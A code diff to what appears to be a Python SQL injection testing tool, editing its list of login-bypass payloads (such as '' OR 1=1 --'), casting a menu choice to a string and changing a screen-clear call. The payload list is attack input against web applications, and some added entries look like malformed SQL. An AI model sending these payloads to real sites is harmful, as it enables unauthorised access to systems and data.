@@ -4,18 +4,17 @@ import json
 from tqdm import tqdm
 from rich import print
 import requests
-from components import clear_screen_and_provide_with_banner
+from components import clear_screen_and_provide_with_banner, clear_screen
 from view.exploit_options import exploit_option
 
 load_dotenv()
 
 base_url = os.environ.get("BASE_URL")
 
-
 class SQLInjection:
     __url = None;
     __payloads = {
-            "default": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"],
+            "default": ["' OR 1=1 --", "' OR sokpheng = sopi --", "admin' or '1'='1'--", "' OR 1=1;","'OR koko=koko --"],
             "medium": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"], # read data from file
             "high": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"], # read data from file
         }
@@ -37,7 +36,7 @@ class SQLInjection:
         new_url = " ";
         selected_payload = []
         # 
-        page_choice = option
+        page_choice = str(option)
         if page_choice == "0":
             clear_screen_and_provide_with_banner.start();
             exploit_option.Exploit().exploit_option();
@@ -51,7 +50,7 @@ class SQLInjection:
             print("[bold yellow]You've selected the HTTP Headers option.[/bold yellow]");
             print("=> This option is under development.. :) )")
         elif page_choice.lower().replace(" ","") == "clear":
-            clear_screen_and_provide_with_banner.start();
+            clear_screen.clear_screen();
             self.choose_options(url);
         else:
             print("[bold red]Invalid choice.[/bold red]")
